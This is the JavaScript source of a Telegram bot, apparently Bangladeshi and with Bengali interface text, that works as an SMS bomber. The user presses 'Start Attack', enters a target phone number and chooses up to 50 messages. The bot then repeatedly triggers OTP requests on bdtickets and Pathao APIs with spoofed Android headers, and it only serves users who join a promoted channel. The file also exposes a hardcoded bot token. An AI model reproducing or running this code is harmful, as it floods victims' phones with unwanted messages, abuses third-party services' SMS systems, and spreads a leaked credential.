const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');

const token = '8784762504:AAFiS-NC-2BSnDauKrTM9GFQ3n91c6_OPfk';
const channelId = '@srmtelecom';
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});
const userStates = {};

// Cloud সচল রাখার সার্ভার
http.createServer((req, res) => {
    res.write("S.R.M TELECOM Android-Mode Active!");
    res.end();
}).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (Android Header) চালু হয়েছে...");

const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🔴 শুরু করুন (Start Attack)' }],
            [{ text: '📢 চ্যানেল জয়েন' }, { text: '💳 হেল্প/সাপোর্ট' }]
        ],
        resize_keyboard: true
    }
};

async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text) return;

    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start') {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\nচ্যানেল: ${channelLink}`, { parse_mode: "Markdown" });
    }

    if (text === '/start') {
        bot.sendMessage(chatId, "🔥 **S.R.M TELECOM অ্যান্ড্রয়েড মোড**\nনিচের বাটন চেপে কাজ শুরু করুন।", mainMenu);
    }

    else if (text === '🔴 শুরু করুন (Start Attack)') {
        userStates[chatId] = { step: 'num' };
        bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", { reply_markup: { remove_keyboard: true } });
    }

    else if (userStates[chatId]?.step === 'num') {
        if (text.length === 11 && text.startsWith('01')) {
            userStates[chatId] = { step: 'amount', number: text };
            bot.sendMessage(chatId, `✅ নম্বর: ${text}\n🔢 **কয়টি SMS পাঠাতে চান? (১-৫০)**`);
        } else { bot.sendMessage(chatId, "❌ সঠিক নম্বর দিন।"); }
    } 

    else if (userStates[chatId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0 || amount > 50) return bot.sendMessage(chatId, "⚠️ ১-৫০ এর মধ্যে লিখুন।");

        const target = userStates[chatId].number;
        delete userStates[chatId];

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে অ্যান্ড্রয়েড হেডার দিয়ে অ্যাটাক শুরু...`);

        let success = 0;
        for (let i = 0; i < amount; i++) {
            try {
                // আপনার দেওয়া JSON Body + Android Header
                await axios.post('https://api.bdtickets.com:20100/v1/auth', {
                    createUserCheck: true,
                    phoneNumber: "+88" + target,
                    applicationChannel: "WEB_APP"
                }, {
                    headers: {
                        'Content-Type': 'application/json',
                        'Sec-Ch-Ua-Platform': '"Android"',
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                        'Accept': 'application/json',
                        'Origin': 'https://bdtickets.com',
                        'Referer': 'https://bdtickets.com/'
                    },
                    timeout: 5000
                });
                success++;
            } catch (e) {
                // ব্যাকআপ এপিআই (যদি মেইনটি ব্লক থাকে)
                try {
                    await axios.post('https://api-hermes.pathao.com/user/otp/send', { 
                        phone: "+88" + target, reason: "login" 
                    }, { headers: { 'Sec-Ch-Ua-Platform': '"Android"' } });
                    success++;
                } catch (err) {}
            }
            await new Promise(r => setTimeout(r, 1500));
        }

        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল: ${success}টি`, mainMenu);
    }
});
